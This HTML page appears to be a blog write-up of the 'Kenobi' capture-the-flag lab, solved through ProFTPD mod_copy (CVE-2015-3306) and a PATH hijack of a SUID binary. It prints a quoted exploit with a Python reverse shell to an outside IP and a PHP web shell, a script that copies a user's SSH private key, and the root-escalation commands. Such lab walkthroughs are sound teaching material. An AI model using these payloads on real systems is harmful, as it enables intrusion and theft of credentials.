<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" as="image" href="/avatar.jpg"/><link rel="stylesheet" href="/_next/static/css/f194b09a73f2e100.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-97a4f47456697fca.js"/><script src="/_next/static/chunks/4bd1b696-4042c1d6d7e15b27.js" async=""></script><script src="/_next/static/chunks/1517-4ce464ed9da3a640.js" async=""></script><script src="/_next/static/chunks/main-app-59d47cb7e6ea11f6.js" async=""></script><script src="/_next/static/chunks/4bd22374-385178446340ab50.js" async=""></script><script src="/_next/static/chunks/8173-a0231b583aa8a812.js" async=""></script><script src="/_next/static/chunks/8541-8e89d807b2dd16b4.js" async=""></script><script src="/_next/static/chunks/5699-d5e6aa1c7bb352a9.js" async=""></script><script src="/_next/static/chunks/app/cyber/writeup/kenobi/page-6c8a26b70c40e028.js" async=""></script><link rel="icon" href="/avatar.jpg"/><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body><div class="Wrapper"><div><div class="burger-menu">☰ <!-- -->            </div><div class="sidebarLeft "><div class="avatar"><img src="/avatar.jpg" alt="Avatar"/></div><ul><a href="/"><li>Search</li></a><a href="/cyber/writeup"><li>Writeups</li></a><a href="/cyber/blog"><li>Blog</li></a><a href="/cyber/tags"><li>Tags</li></a><a href=""><li style="color:#555555">Resources</li></a><a href="/cyber/cheat-sheet"><li>Cheat sheets</li></a></ul></div></div><div class="content"><div class="Post"><div><div id="Blue"><div><h1> <span style="color:#da1953">Ken</span>obi</h1><hr></div><div id="banner"><div><img src="/cyber/writeup/kenobi/banner.gif" alt=""></div></div><div id="Scanning"><div><hr><h1><span style="color:#da1953">Sca</span>nning</h1></div><div><p><pre># Nmap 7.94SVN scan initiated Thu Mar 27 06:47:10 2025 as: nmap -sC -sV -oN nmap 10.10.83.151<br>Nmap scan report for 10.10.83.151<br>Host is up (0.054s latency).<br>Not shown: 993 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE     VERSION<br>21/tcp   open  ftp         ProFTPD 1.3.5<br>22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)<br>|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)<br>|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)<br>80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))<br>|_http-title: Site doesn't have a title (text/html).<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>| http-robots.txt: 1 disallowed entry <br>|_/admin.html<br>111/tcp  open  rpcbind     2-4 (RPC #100000)<br>|_rpcinfo: ERROR: Script execution failed (use -d to debug)<br>139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)<br>2049/tcp open  nfs         2-4 (RPC #100003)<br>Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br>Host script results:<br>| smb2-security-mode: <br>|   3:1:1: <br>|_    Message signing enabled but not required<br>| smb-security-mode: <br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>| smb-os-discovery: <br>|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)<br>|   Computer name: kenobi<br>|   NetBIOS computer name: KENOBI\x00<br>|   Domain name: \x00<br>|   FQDN: kenobi<br>|_  System time: 2025-03-27T05:47:22-05:00<br>|_clock-skew: mean: 1h39m58s, deviation: 2h53m12s, median: -1s<br>| smb2-time: <br>|   date: 2025-03-27T10:47:22<br>|_  start_date: N/A<br>|_nbstat: NetBIOS name: KENOBI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br># Nmap done at Thu Mar 27 06:47:25 2025 -- 1 IP address (1 host up) scanned in 15.55 seconds<br></pre></p></div><div><p>I have 7 open ports: 21 proftpd, 22 ssh, 80 http, 111 rpcbind, 139 netbios-ssn, 445 netbios-ssn and 2049 nfs.</p></div></div><div id="Enumeration"><div><h1><span style="color:#da1953">Enu</span>meration</h1></div><div id="Web-service"><div><h2>Web service</h2></div><div>I started with the web service because it has the most common attack vector for initial footholds. From the Nmap, I can see robots.txt and an admin.txt page.</div><div><p><pre>80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))<br>|_http-title: Site doesn't have a title (text/html).<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>| http-robots.txt: 1 disallowed entry <br>|_/admin.html</pre></p></div><div><p>The admin page is just a rabbit hole, nothing is there, I also tried to analyze the source code and it is simply a pure HTML code.</p></div><div><p><img src="/cyber/writeup/kenobi/trap.png" alt=""></p></div><div><p><img src="/cyber/writeup/kenobi/admincode.PNG" alt=""></p></div><div><p>Additionally, I tried URL brute force to find hidden pages with extension options with Gobuster but did not find anything.</p></div><div><p><pre><b>$</b> gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -u http://10.10.156.3 -x .php,.txt<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://10.10.156.3<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster in directory enumeration mode<br>===============================================================<br>/robots.txt           (Status: 200) [Size: 36]<br>Progress: 244929 / 244932 (100.00%)<br>===============================================================<br>Finished<br>===============================================================</pre></p></div></div><div id="SMB"><div><h2>SMB</h2></div><div><p>To enumerate SMB shares and determine their permissions, you can use a variety of commands. You can also find a good list on <a href="https://0xdf.gitlab.io/cheatsheets/smb-enum">0xdf website</a>.</p></div><div><p><pre><b>$ </b>netexec smb 10.10.156.3 -u 'anythingyouwant' -p '' --shares<br>SMB         10.10.156.3     445    KENOBI           [*] Windows 6.1 (name:KENOBI) (domain:) (signing:False) (SMBv1:True)<br>SMB         10.10.156.3     445    KENOBI           [+] \anythingyouwant: <br>SMB         10.10.156.3     445    KENOBI           [*] Enumerated shares<br>SMB         10.10.156.3     445    KENOBI           Share           Permissions     Remark<br>SMB         10.10.156.3     445    KENOBI           -----           -----------     ------<br>SMB         10.10.156.3     445    KENOBI           print<b>$ </b>                         Printer Drivers<br>SMB         10.10.156.3     445    KENOBI           anonymous       READ            <br>SMB         10.10.156.3     445    KENOBI           IPC<b>$ </b>                           IPC Service (kenobi server (Samba, Ubuntu))<br></pre></p></div><div><p>I have read permission on the anonymous share.  It means I can access and read but not upload any files.</p></div><div><p><pre><b>$ </b>smbclient &apos;\\10.10.156.3\anonymous&apos;<br>Password for [WORKGROUP\kali]:<br>Try "help" to get a list of possible commands.<br>smb: \&gt; ls<br>  .                                   D        0  Wed Sep  4 06:49:09 2019<br>  ..                                  D        0  Wed Sep  4 06:56:07 2019<br>  log.txt                             N    12237  Wed Sep  4 06:49:09 2019<br>9204224 blocks of size 1024. 6852964 blocks available<br>smb: \&gt; get log.txt<br>getting file \log.txt of size 12237 as log.txt (76.1 KiloBytes/sec) (average 76.1 KiloBytes/sec)</pre></p></div><div><p>When the command asks for the password insert your Kali Linux password. To analyze the log.txt I downloaded it so I can open it with my preferred text editor.</p></div><div><p>Reading the log file I can see many interesting things:</p></div><div><p><i><ul><li>Your identification has been saved in /home/kenobi/.ssh/id_rsa.</li><li># Set the user and group under which the server will run.<br>User kenobi<br>Group kenobi</li><li># We want clients to be able to login with "anonymous" as well as "ftp"<br>UserAlias anonymous ftp</li><li>[anonymous]<br>path = /home/kenobi/share</li></ul></i></p></div><div><p>Combining this information with the version of Proftpd 1.3.5 which is vulnerable I can obtain sensitive information, let's see whats <a href+"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3306">mitre.org</a> says about this vulnerability</p></div><div><p><blockquote>The mod_copy module in ProFTPD 1.3.5 allows remote attackers to read and write to arbitrary files via the site cpfr and site cpto commands.</blockquote></p></div><div><p>Basically, I can copy files from one destination to another without being authenticated. This is achieved with the FTP commands CPFR (copy from) and CPTO (copy to), they set the source and the destination. This obviously has no impact on me not giving me remote access, but if I combine it with the information found in the log file I will be able to gain access to the machine.</p></div><div><p>First of all, I know that I have access to the share "<i>anonymous</i>" and the location as well which is <b>/home/kenobi/share</b>. If I copy files in that directory I will be able to retrieve them via SMB as I did with the log file.</p></div><div><p>Now the file I want to copy is just not a random file but some sensitive file that is mentioned in the log which is the id_rsa that is required to log in via SSH without the password. This file location is mentioned in the log file as well, <b>/home/kenobi/.ssh/id_rsa</b>.</p></div></div></div><div id="Exploiting-ProFTPD"><div><h1><span style="color:#da1953">Exp</span>loiting ProFTPD</h1></div><div><p>To exploit ProFTPD I first searched with nsfvenom, and although I found 2 exploits I did not understand what they did by reading the code as it is my first time dealing with FTP exploits.</p></div><div><p><img src="/cyber/writeup/kenobi/searchsploit.PNG" alt=""></p></div><div><p>Then I started to search for different exploits and found this on <a href="https://github.com/synack-jmason/proftpd-1.3.5-reverse-shell-exploit/blob/main/exploit.py">GitHub</a> which is minimalistic and easy to understand. I let ChatGPT explain the code line by line and the logic behind it.</p></div><div><p><pre class="python-code"><span class="comment">#!/usr/bin/env python3</span><br><br><span class="keyword">import</span> socket<br><span class="keyword">import</span> requests<br><br><span class="variable">shell</span> = <span class="string">"python -c 'import os, socket;s=socket.socket();s.connect((\\"192.168.229.30\\", 9001));os.dup2(s.fileno(), 0);os.dup2(s.fileno(), 1);os.dup2(s.fileno(), 2);os.system(\\"/bin/sh\\")'"</span><br><br><span class="keyword">with</span> socket.socket() <span class="keyword">as</span> s:<br>        s.connect((<span class="string">'192.168.229.105'</span>, <span class="number">21</span>))<br>        s.send(b<span class="string">"SITE CPFR /proc/self/cmdline\n"</span>)<br>        s.send(b<span class="string">"SITE CPTO /tmp/&lt;?php system($_GET['c']) ?&gt;\n"</span>)<br>        s.send(b<span class="string">"SITE CPFR /tmp/&lt?php system($_GET['c']) ?&gt;\n"</span>)<br>        s.send(b<span class="string">"SITE CPTO /var/www/html/anything.php\n"</span>)<br><br><span class="variable">r</span> = requests.get(<span class="string">"http://192.168.229.105/anything.php"</span>, params={<span class="string">'c'</span>: shell,})<br>  </pre></p></div><div id="Exploit-explanation"><div><h2>Exploit explanation</h2></div><div><p>​The four lines of code interact with an FTP server to exploit a vulnerability in ProFTPD's <code>mod_copy</code> module, specifically <b>CVE-2015-3306</b>. Let's break down each line and explain how they work together:</p></div><div><p><code>s.send(b"SITE CPFR /proc/self/cmdline
")</code><br>This line sends the <code>SITE CPFR</code> command to the FTP server, specifying <code>/proc/self/cmdline</code> as the source file. In ProFTPD, <code>SITE CPFR</code> (Copy From) is used to specify the file to be copied. The <code>/proc/self/cmdline</code> file contains the command-line arguments of the current process. By targeting this file, the attacker aims to read data that can be manipulated in subsequent steps.</p></div><div><p><code>s.send(b"SITE CPTO /tmp/&lt;?php system($_GET['c']) ?&gt;
")</code><br>This line sends the <code>SITE CPTO</code> command, specifying the destination file path as <code>/tmp/<?php system($_GET['c']) ?></code>. In ProFTPD, <code>SITE CPTO</code> (Copy To) is used to specify the destination file for the copy operation. Here, the destination filename itself contains PHP code (<code>&lt;?php system($_GET['c']) ?&gt;</code>). Due to the way ProFTPD handles these commands, the filename is created as specified, effectively writing the PHP code into the filename. This behavior exploits the vulnerability, allowing the creation of files with arbitrary names that include executable code.</p></div><div><p>In the ProFTPD <code>mod_copy</code> exploit, attackers often choose <code>/proc/self/cmdline</code> as the source file because it's a file that the FTP server process can reliably read without encountering permission issues. This ensures the copy operation proceeds smoothly. The actual content of <code>/proc/self/cmdline</code> isn't significant for the exploit; the key aspect is the ability to create a new file with a malicious name or content in a location accessible by the web server. This method leverages the FTP server's permissions to facilitate unauthorized file creation.</p></div><div><p><code>s.send(b"SITE CPFR /tmp/&lt;?php system($_GET['c']) ?&gt;
")</code><br>This line sends another <code>SITE CPFR</code> command, this time specifying the file just created (<code>/tmp/&lt;?php system($_GET['c']) ?&gt;</code>) as the source file for a new copy operation. This step prepares to move the malicious file to a location where it can be executed via a web server.</p></div><div><p><code>s.send(b"SITE CPTO /var/www/html/anything.php
")</code><br>Finally, this line sends the <code>SITE CPTO</code> command to copy the file from <code>/tmp/&lt;?php system($_GET['c']) ?&gt;</code> to <code>/var/www/html/anything.php</code>. Assuming the web server serves files from <code>/var/www/html/</code>, the attacker can now access <code>anything.php</code> via a web browser. When accessed, this PHP file will execute the command specified in the <code>c</code> parameter of the URL query string, allowing remote code execution on the server.</p></div><div><p>How the PHP Code Ends Up Inside the File?</p></div><div><p>Typically, FTP operations involve copying existing files rather than creating new files with arbitrary content. However, due to the vulnerability in ProFTPD's <code>mod_copy</code> module, the FTP server fails to properly sanitize input and handle permissions. This oversight allows attackers to create files with names that include executable code. In this exploit, the filename itself contains PHP code, and when the file is placed in a web-accessible directory, the web server interprets and executes the code within the filename.</p></div><div><p>Now I have to adapt this code for my scenario as I do not have PHP.</p></div></div><div id="Rewrite-the-exploit"><div><h2>Rewrite the exploit</h2></div><div>Once understood the code I was able to craft my version that applies in this scenario. As I do not have PHP I have to adapt the code to copy the <code>id_rsa</code> into <code>/home/kenobi/share</code>. Follwoing the new explot:</div><div><p><pre class="python-code"><br><span class="keyword">import</span> socket<br><br><span class="comment"># FTP server details</span><br><span class="variable">ftp_server</span> = <span class="string">'10.10.60.162'</span><br><span class="variable">ftp_port</span> = <span class="number">21</span><br><br><span class="comment"># Source and destination paths</span><br><span class="variable">source_file</span> = <span class="string">'/home/kenobi/.ssh/id_rsa'</span><br><br><span class="variable">destination_file</span> = <span class="string">'/home/kenobi/share/id_rsa'</span><br><span class="comment"># Connect to the FTP server</span><br><br><span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:<br>    s.connect((ftp_server, ftp_port))<br>    <span class="variable">response</span> = s.recv(<span class="number">1024</span>)<br>    <span class="function">print</span>(response.decode())<br><br>    <span class="comment"># Send SITE CPFR command to specify the source file</span><br>    s.sendall(f<span class="string">'SITE CPFR {source_file}\n'</span>.encode())<br>    response = s.recv(<span class="number">1024</span>)<br>    <span class="function">print</span>(response.decode())<br><br>    <span class="comment"># Send SITE CPTO command to specify the destination file</span><br>    s.sendall(f<span class="string">'SITE CPTO {destination_file}\n'</span>.encode())<br>    response = s.recv(<span class="number">1024</span>)<br>    <span class="function">print</span>(response.decode())<br>  </pre></p></div><div><p><pre><b>$ </b>python3 myexp.py <br>220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.184.80]<br>350 File or directory exists, ready for destination name<br>250 Copy successful<br></pre></p></div><div><p>Now that the copy is completed I can check if I can find it in the share named anonymous.</p></div><div><p><pre><b>$ </b>smbclient '\\10.10.184.80\anonymous'<br>Password for [WORKGROUP\kali]:<br>Try "help" to get a list of possible commands.<br>smb: \&gt; ls<br>  .                                   D        0  Sat Mar 29 08:56:11 2025<br>  ..                                  D        0  Wed Sep  4 06:56:07 2019<br>  id_rsa                              N     1675  Sat Mar 29 08:56:11 2025<br>  log.txt                             N    12237  Wed Sep  4 06:49:09 2019<br><br>9204224 blocks of size 1024. 6877112 blocks available<br>smb: \&gt; </pre></p></div><div><p>The private key is in the share, now I can download and use it.</p></div><div><p><pre>smb: \&gt; get id_rsa<br>getting file \id_rsa of size 1675 as id_rsa (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)<br>smb: \&gt; <br></pre></p></div></div></div><div id="Access-as-Kenobi"><div><h1><span style="color:#da1953">Acc</span>ess as Kenobi</h1></div><div><p>To access via SSH as Kenobi I can simply use the downloaded private key without any passwrd. Before that I have to set the file permission to 600.<br><code><b>$ </b>chmod 600 id_rsa</code></p></div><div><p><pre><b>$ </b>ssh -i ./id_rsa kenobi@10.10.184.80<br>The authenticity of host '10.10.184.80 (10.10.184.80)' can't be established.<br>ED25519 key fingerprinis SHA256:GXu1mgqL0Wk2ZHPmEUVIS0hvusx4hk33iTcwNKPktFw.<br>This host key is known by the following other names/addresses:<br>    ~/.ssh/known_hosts:11[hashed name]<br>    ~/.ssh/known_hosts:12: [hashed name]<br>    ~/.ssh/known_hosts:13: [hashed name]<br>Are you sure you want to continue connecting (yeno/[fingerprint])? yes<br>Warning: Permanently added '10.10.184.80' (ED25519) to the list of known hosts.<br>Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.0-58-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https:ubuntu.com/advantage<br><br>103 packages can be updated.<br>65 updates are security updates.<br><br><br>Last login: Wed Sep  4 07:10:15 2019 from 192.161.147<br>To run a command as administrator (user "root"), use "sudo <command>".<br>See "man sudo_root" for details.<br><br><b>kenobi@kenobi</b>:~$</pre></p></div><div><p>You can find the user flag in the current directory which is Kenobi's home directory.</p></div><div><p><pre><b>kenobi@kenobi</b>:~$ cat user.txt<br>d0b0f3f53b6caa532a83915e19224899</pre></p></div></div><div id="Privilege-Escalation"><div><h1><span style="color:#da1953">Pri</span>vilege Escalation</h1></div><div id="Host-enumeration"><div><h2>Host enumeration</h2></div><div><p>The first thing I usually do to find a misconfiguration to elevate my privilege is execute <code>sudo -l</code> to check what program I can run with sudo privilege without the need for the password.</p></div><div><p><img src="/cyber/writeup/kenobi/sudopass.PNG" alt=""></p></div><div><p>Unfortunately on this occasion, I am not able to run the command as I do not know the password and I need to figure out a different strategy. If I want to proceed with manual enumeration it will take me a very long when I can use <a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS">Linpeas</a> and go from there, saving a lot of time.</p></div><div><p>I first downloaded <a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS">Linpeas</a> on my Kali box and then downloaded it to the target machine via Python webserver.</p></div><div><p><pre><b>$ </b>python -m http.server 80<br>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br>10.10.220.32 - - [31/Mar/2025 06:50:57] "GET /linpeas.sh HTTP/1.1" 200 -</pre></p></div><div><p><pre><b>kenobi@kenobi</b>:~$ wget http://10.21.112.161/linpeas.sh<br>--2025-03-31 05:50:56--  http://10.21.112.161/linpeas.sh<br>Connecting to 10.21.112.161:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 840082 (820K) [text/x-sh]<br>Saving to: ‘linpeas.sh’<br><br>linpeas.sh                                100%[==================================================================================>] 820.39K  1.49MB/s    in 0.5s    <br><br>2025-03-31 05:50:57 (1.49 MB/s) - ‘linpeas.sh’ saved [840082/840082]</pre></p></div><div><p><a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS">Linpeas</a> makes your life easy by telling you what to check.</p></div><div><p><img src="/cyber/writeup/kenobi/linlegend.PNG" alt=""></p></div><div><p>And the first thing it flags is the PATH, and it also gives the link to <a href="https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses">Hacktricks</a> for further information.</p></div><div><p><img src="/cyber/writeup/kenobi/path.PNG" alt=""></p></div><div><p>The first thing Hacktricks suggests is performing <code>sudo -l</code> which I already discarded, the second command to find the programs that contain SUID is <code>find / -perm -4000 2>/dev/null</code>.</p></div><div><p><img src="/cyber/writeup/kenobi/hacktrickssuid.jpg" alt=""></p></div><div><p>And it shows the following installed programs:</p></div><div><p><pre><b>kenobi@kenobi</b>:~$ find / -perm -4000 2>/dev/null<br>/sbin/mount.nfs<br>/usr/lib/policykit-1/polkit-agent-helper-1<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/snapd/snap-confine<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic<br>/usr/bin/chfn<br>/usr/bin/newgidmap<br>/usr/bin/pkexec<br>/usr/bin/passwd<br>/usr/bin/newuidmap<br>/usr/bin/gpasswd<br>/usr/bin/menu<br>/usr/bin/sudo<br>/usr/bin/chsh<br>/usr/bin/at<br>/usr/bin/newgrp<br>/bin/umount<br>/bin/fusermount<br>/bin/mount<br>/bin/ping<br>/bin/su<br>/bin/ping6</pre></p></div><div><p>Here the output is mixed with user installed program and the system program, but I am pretty sure you can guess which program was installed by the user and is not a system program. To double check I checked the <a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS">Linpeas</a> output.</p></div><div><p><img src="/cyber/writeup/kenobi/linoutput.PNG" alt=""></p></div><div><p>The only program that seems actually installed by the user is the <b>menu</b> program.</p></div></div><div id="Hijacking-execution"><div><h2>Hijacking execution</h2></div><div>Folllwing the execution of the <b>menu</b> program</div><div><p><pre><b>kenobi@kenobi</b>:~$ /usr/bin/menu<br><br>***************************************<br>1. status check<br>2. kernel version<br>3. ifconfig<br>** Enter your choice :1<br>HTTP/1.1 200 OK<br>Date: Mon, 31 Mar 2025 11:21:04 GMT<br>Server: Apache/2.4.18 (Ubuntu)<br>Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT<br>ETag: "c8-591b6884b6ed2"<br>Accept-Ranges: bytes<br>Content-Length: 200<br>Vary: Accept-Encoding<br>Content-Type: text/html<br><br><b>kenobi@kenobi</b>:~$ /usr/bin/menu<br><br>***************************************<br>1. status check<br>2. kernel version<br>3. ifconfig<br>** Enter your choice :2<br>4.8.0-58-generic<br><br><b>kenobi@kenobi</b>:~$ /usr/bin/menu<br><br>***************************************<br>1. status check<br>2. kernel version<br>3. ifconfig<br>** Enter your choice :3<br>eth0      Link encap:Ethernet  HWaddr 02:64:f3:a4:88:b7  <br>          inet addr:10.10.220.32  Bcast:10.10.255.255  Mask:255.255.0.0<br>          inet6 addr: fe80::64:f3ff:fea4:88b7/64 Scope:Link<br>          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1<br>          RX packets:1955 errors:0 dropped:0 overruns:0 frame:0<br>          TX packets:1974 errors:0 dropped:0 overruns:0 carrier:0<br>          collisions:0 txqueuelen:1000 <br>          RX bytes:966897 (966.8 KB)  TX bytes:362406 (362.4 KB)<br><br>lo        Link encap:Local Loopback  <br>          inet addr:127.0.0.1  Mask:255.0.0.0<br>          inet6 addr: ::1/128 Scope:Host<br>          UP LOOPBACK RUNNING  MTU:65536  Metric:1<br>          RX packets:190 errors:0 dropped:0 overruns:0 frame:0<br>          TX packets:190 errors:0 dropped:0 overruns:0 carrier:0<br>          collisions:0 txqueuelen:1 <br>          RX bytes:14101 (14.1 KB)  TX bytes:14101 (14.1 KB)<br></pre></p></div><div><p>From the execution nothing interesting, everything seems pretty basic, but the program has SUID which we confirmed earlier during the enumeration phase. Let's try to <code>strings</code> the program.</p></div><div><p><pre><b>kenobi@kenobi</b>:~$ strings /usr/bin/menu<br>/lib64/ld-linux-x86-64.so.2<br>libc.so.6<br>setuid<br>[...REDACTED...]<br>***************************************<br>1. status check<br>2. kernel version<br>3. ifconfig<br>** Enter your choice :<br>curl -I localhost<br>uname -r<br>ifconfig<br>[...REDACTED...]</pre></p></div><div><p>The presence of the <i>suid</i> string makes clear that it is executing the program commands: <code>curl -I localhost</code>, <code>uname -r</code>, <code>ifconfig</code>, with elevated privilege.</p></div><div><p>To hijack the exection I need to check the PATH variable. The question to ask is: how does the terminal know where the program is when I write the name in the terminal like id, pwd, ls etc.? It uses a variable called PATH that lists a series of folder to check if they contains any program with the spcified name.</p></div><div><p><pre><b>kenobi@kenobi</b>:~$ $PATH<br>-bash: /home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin: No such file or directory</pre></p></div><div><p>in this case the search paths are <i>/home/kenobi/bin</i>, <i>/home/kenobi/.local/bin</i>, <i>/usr/local/sbin</i>, <i>/usr/local/bin</i>, <i>/usr/sbin</i>, <i>/usr/bin</i>, <i>/sbin</i>, <i>/bin</i>, <i>/usr/games</i>, <i>/usr/local/games</i>, <i>/snap/bin</i>, and the first match will be executed as it check these folder in order. Each user has their own list of paths stored in the PATH variable. This means different users can have different paths where the system looks for programs.</p></div><div><p>If I create a program and put it in the first path of the list, the system will check that path first before looking at others. If it finds the program there, it won’t check the rest of the paths. This can be used to trick the system into executing unintended programs.</p></div><div><p>The first path is <code>/home/kenobi/bin</code> which is in the home directory. The bin folder does not exist so I can create it <code>mkdir bin</code> and put in a program named ifconfig that does a simple <code>/bin/bash</code> and it will be executed by the menu program with suid and root privileges.</p></div><div><p><pre><b>kenobi@kenobi</b>:~$ pwd<br>/home/kenobi<br><b>kenobi@kenobi</b>:~$ mkdir bin<br><b>kenobi@kenobi</b>:~$ echo -e '#!/bin/bash\n/bin/bash' > ./bin/ifconfig<br><b>kenobi@kenobi</b>:~$ cat ./bin/ifconfig <br>#!/bin/bash<br>/bin/bash<br><b>kenobi@kenobi</b>:~$ chmod 777 ./bin/ifconfig</pre></p></div><div><p>Note that I used <code>-e</code> options for the <code>echo</code> command as there is a new line and it has to be enclosed in single quotes! Additionally, the new <code>ifconfig</code> program created needs permissions to be executed and I just gave 777 as maximum privileges for everyone as I did not care about giving the minimum privileges.</p></div><div><p>At this point, I just have to execute the menu program and choose option 3 for <code>ifconfig</code>. Then you can find the flag in the <b>root</b> directory</p></div><div><p><pre><b>kenobi@kenobi</b>:~$ /usr/bin/menu <br><br>***************************************<br>1. status check<br>2. kernel version<br>3. ifconfig<br>** Enter your choice :3<br>To run a command as administrator (user "root"), use "sudo <command>".<br>See "man sudo_root" for details.<br><br><b>root@kenobi</b>:~# whoami<br>root<br><b>root@kenobi</b>:~# cat /root/root.txt <br>177b3cd8562289f37382721c28381f02</pre></p></div></div></div><div id="Intended-way"><div><h1><span style="color:#da1953">Int</span>ended way</h1></div><div id="Enumerating-NFS"><div><h2>Enumerating NFS</h2></div><div><p><pre><b>$ </b>nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.76.103<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-31 16:24 EDT<br>Nmap scan report for 10.10.76.103<br>Host is up (0.073s latency).<br><br>PORT    STATE SERVICE<br>111/tcp open  rpcbind<br>| nfs-showmount: <br>|_  /var *<br><br>Nmap done: 1 IP address (1 host up) scanned in 1.09 seconds</pre></p></div><div><p>This shows that the NFS mounts the <code>/var</code> folder so I can use <code>/var</code> and any sub-folders. If I mount the NFS I will be able to see the whole file structure of the <code>/var</code> folder. It means if I copy the <code>id_rsa</code> file into <code>/var/tmp</code> and then mount the NFS and access the SSH private key.</p></div></div><div id="Access-and-exploit-ProFTPD-via-NetCat"><div><h2>Access and exploit ProFTPD via NetCat</h2></div><div><p><pre><b>$ </b>nc 10.10.76.103 21<br>220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.76.103]<br>SITE CPFR /home/kenobi/.ssh/id_rsa<br>350 File or directory exists, ready for destination name<br>SITE CPTO /var/tmp/id_rsa<br>250 Copy successful</pre></p></div></div><div id="Mounting-NFS-to-retrieve-SSH-private-key"><div><h2>Mounting NFS to retrieve SSH private key</h2></div><div><p><pre><b>$</b> sudo mkdir /mnt/kenobiNFS<br>[sudo] password for kali:<br><b>$</b> sudo mount 10.10.76.103:/var /mnt/kenobiNFS<br><b>$</b> ls -la /mnt/kenobiNFS<br>total 56<br>drwxr-xr-x 14 root root  4096 Sep  4  2019 .<br>drwxr-xr-x  3 root root  4096 Mar 31 16:39 ..<br>drwxr-xr-x  2 root root  4096 Sep  4  2019 backups<br>drwxr-xr-x  9 root root  4096 Sep  4  2019 cache<br>drwxrwxrwt  2 root root  4096 Sep  4  2019 crash<br>drwxr-xr-x 40 root root  4096 Sep  4  2019 lib<br>drwxrwsr-x  2 root staff 4096 Apr 12  2016 local<br>lrwxrwxrwx  1 root root     9 Sep  4  2019 lock -> /run/lock<br>drwxrwxr-x 10 root _ssh  4096 Sep  4  2019 log<br>drwxrwsr-x  2 root mail  4096 Feb 26  2019 mail<br>drwxr-xr-x  2 root root  4096 Feb 26  2019 opt<br>lrwxrwxrwx  1 root root     4 Sep  4  2019 run -> /run<br>drwxr-xr-x  2 root root  4096 Jan 29  2019 snap<br>drwxr-xr-x  5 root root  4096 Sep  4  2019 spool<br>drwxrwxrwt  6 root root  4096 Mar 31 16:36 tmp<br>drwxr-xr-x  3 root root  4096 Sep  4  2019 www<br><b>$</b> ls /mnt/kenobiNFS/tmp/<br>id_rsa<br>systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM<br>systemd-private-6bb93e4c0c12426383667820b5bc38ed-systemd-timesyncd.service-MVbD23<br>systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw<br>systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn<br><b>$</b> cp /mnt/kenobiNFS/tmp/id_rsa /home/kali/thm/kenobi/</pre></p></div><div><p>Now on you can continue reading from <a href="#Access-as-Kenobi">Access as Kenobi</a>.</p></div></div></div></div> </div></div></div><div class="sidebarRight"><div class="sidebarRightChild"><h2>Index</h2><div></div><br/><h2>Tags</h2><div class="tags"><a style="margin-top:10px" 